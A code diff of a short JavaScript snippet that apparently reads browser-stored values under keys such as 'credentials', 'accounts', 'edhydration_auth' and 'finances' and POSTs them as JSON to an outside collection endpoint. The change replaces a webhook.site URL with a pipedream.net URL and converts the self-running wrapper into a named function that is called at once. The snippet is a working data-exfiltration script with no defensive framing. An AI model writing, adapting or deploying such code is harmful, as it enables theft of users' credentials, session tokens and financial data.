@@ -1,11 +1,11 @@
-(async function () {
+async function extraire() {
   const keys = [
     'accounts', 'badges', 'credentials', 'edhydration_auth',
     'etablissement', 'finances',
     'bigAds', 'fa', 'pdfjs.history'
   ];
-
-  const url = 'https://webhook.site/ac1d52e4-7f8b-4c26-a4e3-5c2d97e33be3';
+  
+  const url = 'https://eo1w3ilotwrjzkh.m.pipedream.net';
 
   const data = {
     t: new Date().toISOString(),
@@ -34,4 +34,5 @@
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(data)
   });
-})();
+});
+extraire();
